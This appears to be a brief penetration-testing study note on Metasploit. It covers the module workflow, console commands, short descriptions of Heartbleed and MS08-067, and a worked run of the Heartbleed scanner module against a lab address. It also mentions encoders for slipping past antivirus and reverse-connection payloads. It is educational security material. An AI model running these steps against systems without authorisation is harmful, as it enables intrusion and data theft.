# [Metasploit](https://www.metasploit.com/)

> Metasploit is an exploit development and execution tool. It can also be used to carry out penetration testing tasks such as port scans, service identification and post exploitation tasks.

* Basic Steps
* General commands
* Exploits
* Payloads (See [Payload Types]())

## Basic Steps

1. Pick an *exploit*/*module* to use.
2. Set your options for the module (`set`).
   * Set the victim hosts and ports.
   * Set your local hosts and ports.
   * Possibly set system versions, user accounts, and other information.
   * Issue the `show options` command to see what options are required or needed.
3. Configuring *payloads*.
   * Payloads are what should happen after the vulnerability is exploited.
   * Issue `show payloads` and then select one using `set payloads`.
4. Set *encoders*.
   * Encoders are the basic way to obfuscate the attack in Metasploit. Sadly, this still often triggers on AV.
   * Issue `show encoders` and then select one using `set encoders`.
5. Set additional options.
6. Run the selected and configured attack issuing the `exploit` command. 
   
> [Metasploit Cheat Sheet](https://cheatography.com/huntereight/cheat-sheets/metasploit-4-5-0-dev-15713/)

## General commands

```
msfconsole
help
show [something] // (i.e, show payloads, show options)
use [something]
set [option] [value]
exploit
```

## Exploits

Download exploits from Rapid7 based on gathering information on target's services.

* **Heartbleed**: Get data from the heap memory of a vulnerable machine (accepting and processing new SSL connections). Data depends largely on the timing of when the exploit is performed. Not getting something highly valuable does not equate to a failed exploit

* [MS08-067](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067): The vulnerability could allow remote code execution if an affected system received a specially crafted RPC request.

### Example: Heartbleed

```
sudo msfdb start
msfconsole
search heartbleed
use auxiliary/scanner/ssl/openssl_heartbleed
# list module options
show options
# set options
set VERBOSE true
set RHOSTS 10.0.0.101
run
```

## Payloads

Some exploits allow for injecting payloads, expanding our attack vectors, i.e. triggering reverse connections.
